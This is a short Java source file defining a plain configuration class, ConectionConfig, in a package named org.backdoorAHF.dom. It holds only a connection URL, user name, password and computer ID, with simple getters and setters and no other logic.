package org.backdoorAHF.dom;

public class ConectionConfig {

	private String conectionURL; 
	private String user;
	private String password;
	private int computerID;
	
	public int getComputerID() {
		return computerID;
	}
	public void setComputerID(int computerID) {
		this.computerID = computerID;
	}
	public String getConectionURL() {
		return conectionURL;
	}
	public void setConectionURL(String conectionURL) {
		this.conectionURL = conectionURL;
	}
	public String getUser() {
		return user;
	}
	public void setUser(String user) {
		this.user = user;
	}
	public String getPassword() {
		return password;
	}
	public void setPassword(String password) {
		this.password = password;
	}
	
	

}
